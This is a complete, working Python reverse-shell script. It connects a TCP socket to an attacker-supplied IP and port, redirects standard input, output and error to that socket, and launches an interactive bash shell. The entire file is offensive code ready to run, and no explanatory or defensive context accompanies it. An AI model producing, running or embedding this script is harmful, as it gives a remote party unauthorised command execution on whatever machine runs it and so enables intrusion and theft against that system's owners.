#!/usr/bin/python3
# Reverse Shell

import subprocess
import atexit
import socket
import sys
import os

if len(sys.argv) != 3:
	print('[-] Usage: rev_shell.py <IP> <PORT>')
	exit()

host = sys.argv[1]
port = int(sys.argv[2])

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.connect((host, port))
atexit.register(server.close)

# File Descriptors:
fd = server.fileno()

os.dup2(fd, 0)	# In
os.dup2(fd, 1)	# Out
os.dup2(fd, 2)	# Err

p = subprocess.call(['/bin/bash', '-i'])
